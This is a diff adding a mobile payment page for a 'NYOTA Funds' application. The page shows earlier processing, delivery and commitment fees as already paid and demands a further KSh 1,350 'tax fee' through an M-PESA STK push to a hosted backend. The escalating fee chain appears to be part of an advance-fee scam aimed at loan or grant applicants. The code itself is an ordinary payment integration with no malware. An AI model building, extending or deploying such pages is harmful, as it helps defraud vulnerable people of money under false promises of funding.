@@ -1,1 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<title>Tax / Service Payment</title>
+
+<style>
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    padding:16px 10px;
+    font-family:Arial,sans-serif;
+    background:#0B0217;
+    color:#fff;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    margin:0 auto;
+}
+
+.card{
+    width:100%;
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,0.09),
+            rgba(255,255,255,0.035)
+        );
+    padding:22px 18px 18px;
+    border-radius:18px;
+    box-shadow:
+        0 20px 60px rgba(0,0,0,0.45),
+        inset 0 1px 0 rgba(255,255,255,0.05);
+    border:1px solid rgba(255,255,255,0.10);
+}
+
+h1{
+    color:#fff;
+    font-size:22px;
+    font-weight:700;
+    text-align:center;
+    margin:2px 0 16px;
+}
+
+.status{
+    background:rgba(155,53,255,0.08);
+    color:#B86CFF;
+    padding:14px 12px;
+    border-radius:12px;
+    font-size:14px;
+    line-height:1.7;
+    text-align:center;
+    margin-bottom:10px;
+    border:1px solid rgba(155,53,255,0.18);
+}
+
+.info{
+    background:rgba(255,255,255,0.05);
+    color:rgba(255,255,255,0.72);
+    padding:14px 12px;
+    border-radius:12px;
+    font-size:14px;
+    line-height:1.5;
+    text-align:center;
+    margin-bottom:15px;
+    border:1px solid rgba(255,255,255,0.10);
+}
+
+.customer{
+    background:rgba(255,255,255,0.045);
+    padding:15px;
+    border-radius:13px;
+    text-align:left;
+    font-size:14px;
+    border:1px solid rgba(255,255,255,0.10);
+    margin-bottom:15px;
+}
+
+.customer p{
+    margin:9px 0;
+    line-height:1.45;
+}
+
+.customer b{
+    color:rgba(255,255,255,0.88);
+}
+
+.customer span{
+    color:#B86CFF;
+    font-weight:600;
+}
+
+.amount{
+    background:rgba(155,53,255,0.08);
+    border:1px solid rgba(155,53,255,0.18);
+    color:#B86CFF;
+    padding:14px 12px;
+    border-radius:12px;
+    text-align:center;
+    font-size:18px;
+    font-weight:700;
+    margin-bottom:15px;
+}
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:5px;
+    border:none;
+    border-radius:11px;
+    background:
+        linear-gradient(
+            135deg,
+            #9B35FF,
+            #6C1DCE
+        );
+    color:#fff;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+    box-shadow:
+        0 10px 30px rgba(137,43,226,0.30);
+}
+
+button:disabled{
+    background:rgba(255,255,255,0.25);
+    color:rgba(255,255,255,0.55);
+    cursor:not-allowed;
+    box-shadow:none;
+}
+
+#stkMessage{
+    min-height:20px;
+    margin-top:12px;
+    text-align:center;
+    font-size:13px;
+    line-height:1.4;
+    color:rgba(255,255,255,0.65);
+}
+
+.success{
+    color:#6DFFAA !important;
+}
+
+.error{
+    color:#FF7D8A !important;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<h1>TAX FEE PAYMENT</h1>
+
+<div class="status">
+✅ Processing Fee Paid<br>
+✅ Delivery Charges Fee Paid<br>
+✅ Commitment Fee Paid
+</div>
+
+<div class="info">
+    Congratulations! Your application has reached the final tax payment stage.
+
+Complete the payment below to finalize the processing of your NYOTA Funds application
+</div>
+
+<div class="customer">
+
+<p>
+<b>Applicant:</b>
+<span id="fullName">Loading...</span>
+</p>2
+
+<p>
+<b>Phone:</b>
+<span id="phone">Loading...</span>
+</p>
+
+</div>
+
+<div class="amount">
+    TAX FEE: KSh 1,350
+</div>
+
+<button
+    id="payBtn"
+    type="button"
+    onclick="payNow()"
+>
+    Pay KSh 1,350
+</button>
+
+<p id="stkMessage"></p>
+
+</div>
+
+</div>
+
+
+<script>
+
+"use strict";
+
+
+/*
+|--------------------------------------------------------------------------
+| SAME BACKEND USED BY YOUR WORKING PAYMENT PAGES
+|--------------------------------------------------------------------------
+*/
+
+const BACKEND_URL =
+    "https://nyota-program-backend.onrender.com";
+
+const PAYMENT_AMOUNT = 1350;
+
+
+/*
+|--------------------------------------------------------------------------
+| CUSTOMER DETAILS
+|--------------------------------------------------------------------------
+*/
+
+const fullName =
+    localStorage.getItem("fullName");
+
+const phone =
+    localStorage.getItem("phoneNumber");
+
+
+document.getElementById("fullName")
+    .textContent =
+        fullName || "Applicant";
+
+
+document.getElementById("phone")
+    .textContent =
+        phone || "Not available";
+
+
+/*
+|--------------------------------------------------------------------------
+| ELEMENTS
+|--------------------------------------------------------------------------
+*/
+
+const payBtn =
+    document.getElementById("payBtn");
+
+const message =
+    document.getElementById("stkMessage");
+
+
+/*
+|--------------------------------------------------------------------------
+| STATUS
+|--------------------------------------------------------------------------
+*/
+
+function setMessage(
+    text,
+    type = ""
+){
+
+    message.textContent = text;
+    message.className = type;
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| BUTTON
+|--------------------------------------------------------------------------
+*/
+
+function setButton(
+    disabled,
+    text
+){
+
+    payBtn.disabled = disabled;
+    payBtn.textContent = text;
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| START PAYMENT
+|--------------------------------------------------------------------------
+*/
+
+async function payNow(){
+
+    const savedPhone =
+        localStorage.getItem(
+            "phoneNumber"
+        );
+
+
+    if(!savedPhone){
+
+        setMessage(
+            "Phone number not found. Please return to the previous page.",
+            "error"
+        );
+
+        return;
+    }
+
+
+    setButton(
+        true,
+        "Sending STK Push..."
+    );
+
+
+    setMessage(
+        "Sending payment request..."
+    );
+
+
+    try{
+
+        const response =
+            await fetch(
+                BACKEND_URL +
+                "/stk-push",
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:
+                            savedPhone,
+
+                        amount:
+                            PAYMENT_AMOUNT
+
+                    })
+                }
+            );
+
+
+        const data =
+            await response.json();
+
+
+        console.log(
+            "STK RESPONSE:",
+            data
+        );
+
+
+        if(
+            !response.ok ||
+            data.success === false
+        ){
+
+            throw new Error(
+                data.message ||
+                "Payment request failed."
+            );
+        }
+
+
+        /*
+         * Support the transaction ID formats
+         * returned by your backend.
+         */
+
+        const transactionId =
+
+            data.transactionId ||
+
+            data.checkout_request_id ||
+
+            data.data?.transactionId ||
+
+            data.data?.checkout_request_id;
+
+
+        if(!transactionId){
+
+            throw new Error(
+                "No payment transaction ID was returned."
+            );
+        }
+
+
+        localStorage.setItem(
+            "taxTransactionId",
+            transactionId
+        );
+
+
+        setButton(
+            true,
+            "Waiting for payment..."
+        );
+
+
+        setMessage(
+            "STK Push sent successfully. Enter your M-PESA PIN."
+        );
+
+
+        await checkPayment(
+            transactionId
+        );
+
+
+    }catch(error){
+
+        console.error(
+            "STK ERROR:",
+            error
+        );
+
+
+        setMessage(
+            error.message ||
+            "Payment request failed. Please try again.",
+            "error"
+        );
+
+
+        setButton(
+            false,
+            "Pay KSh 1,350"
+        );
+    }
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| PAYMENT STATUS
+|--------------------------------------------------------------------------
+*/
+
+async function checkPayment(
+    transactionId
+){
+
+    const startTime =
+        Date.now();
+
+    const timeout =
+        2 * 60 * 1000;
+
+
+    while(
+        Date.now() -
+        startTime <
+        timeout
+    ){
+
+        try{
+
+            const response =
+                await fetch(
+                    BACKEND_URL +
+                    "/payment-status",
+                    {
+                        method:"POST",
+
+                        headers:{
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body:JSON.stringify({
+
+                            transactionId:
+                                transactionId
+
+                        })
+                    }
+                );
+
+
+            const result =
+                await response.json();
+
+
+            console.log(
+                "PAYMENT STATUS:",
+                result
+            );
+
+
+            /*
+             * Support both:
+             *
+             * result.status
+             *
+             * result.data.status
+             */
+
+            const payment =
+                result.data ||
+                result;
+
+
+            const status =
+                String(
+                    payment.status ||
+                    payment.data?.status ||
+                    ""
+                ).toUpperCase();
+
+
+            /*
+             * SUCCESS
+             */
+
+            if(
+
+                status === "COMPLETED" ||
+
+                status === "SUCCESS" ||
+
+                status === "CONFIRMED"
+
+            ){
+
+                setMessage(
+                    "Payment confirmed successfully. Redirecting...",
+                    "success"
+                );
+
+
+                setButton(
+                    true,
+                    "Payment Confirmed"
+                );
+
+
+                setTimeout(
+                    function(){
+
+                        window.location.href =
+                            "final.html";
+
+                    },
+                    1000
+                );
+
+
+                return;
+            }
+
+
+            /*
+             * FAILED
+             */
+
+            if(
+
+                status === "FAILED" ||
+
+                status === "CANCELLED" ||
+
+                status === "EXPIRED"
+
+            ){
+
+                setMessage(
+                    "Payment " +
+                    status.toLowerCase() +
+                    ".",
+                    "error"
+                );
+
+
+                setButton(
+                    false,
+                    "Pay KSh 1,350"
+                );
+
+
+                return;
+            }
+
+
+            setMessage(
+                "Confirming payment..."
+            );
+
+
+        }catch(error){
+
+            console.error(
+                "STATUS ERROR:",
+                error
+            );
+
+        }
+
+
+        /*
+         * Poll every 3 seconds.
+         */
+
+        await new Promise(
+            function(resolve){
+
+                setTimeout(
+                    resolve,
+                    3000
+                );
+
+            }
+        );
+    }
+
+
+    /*
+     * TIMEOUT
+     */
+
+    setMessage(
+        "Payment confirmation timed out. Check your M-PESA messages before trying again.",
+        "error"
+    );
+
+
+    setButton(
+        false,
+        "Pay KSh 1,350"
+    );
+}
+
+</script>
+
+</body>
+  </html>
